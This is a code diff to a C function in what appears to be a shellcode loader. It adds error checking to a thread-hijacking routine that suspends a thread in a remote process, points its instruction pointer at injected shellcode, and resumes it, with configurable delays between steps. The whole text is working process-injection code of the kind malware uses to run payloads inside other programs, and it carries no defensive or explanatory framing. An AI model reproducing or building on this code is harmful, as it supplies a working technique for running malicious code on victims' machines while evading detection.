@@ -70,26 +70,41 @@ static inline HANDLE find_thread(DWORD targetPid) {
 
 BOOL execution_run(MemoryInfo memInfo) {
 	
+    NTSTATUS stat;
 
     HANDLE hThread = find_thread(memInfo.remotePid);
     if (hThread == NULL) {
         DBGA("[!] Failed Finding Thread!\n");
         return FALSE;
     }
-    g_ldr->apis->NtSuspendThread(hThread, NULL);
-
+    stat = g_ldr->apis->NtSuspendThread(hThread, NULL);
+    if (!NT_SUCCESS(stat)) {
+        DBGA("[!] Failed Suspeneding Thread\n");
+        return FALSE;
+    }
     ldr_sleep(g_ldr->config->DelayBetween);
 
     CONTEXT threadContext;
-    g_ldr->apis->NtGetContextThread(hThread, &threadContext);
+    stat = g_ldr->apis->NtGetContextThread(hThread, &threadContext);
+    if (!NT_SUCCESS(stat)) {
+        DBGA("[!] Failed Getting Thread Context\n");
+        return FALSE;
+    }
     ldr_sleep(g_ldr->config->DelayBetween);
 
     threadContext.Rip = (DWORD64)memInfo.ShellCodeAddress;
-    g_ldr->apis->NtSetContextThread(hThread, &threadContext);
+    stat = g_ldr->apis->NtSetContextThread(hThread, &threadContext);
+    if (!NT_SUCCESS(stat)) {
+        DBGA("[!] Failed Setting Thread context\n");
+        return FALSE;
+    }
     ldr_sleep(g_ldr->config->DelayBefore);
 
-    g_ldr->apis->NtResumeThread(hThread, NULL);
-
+    stat = g_ldr->apis->NtResumeThread(hThread, NULL);
+    if (!NT_SUCCESS(stat)) {
+        DBGA("[!] Failed Resuming Thread\n");
+        return FALSE;
+    }
 
 
 	return TRUE;
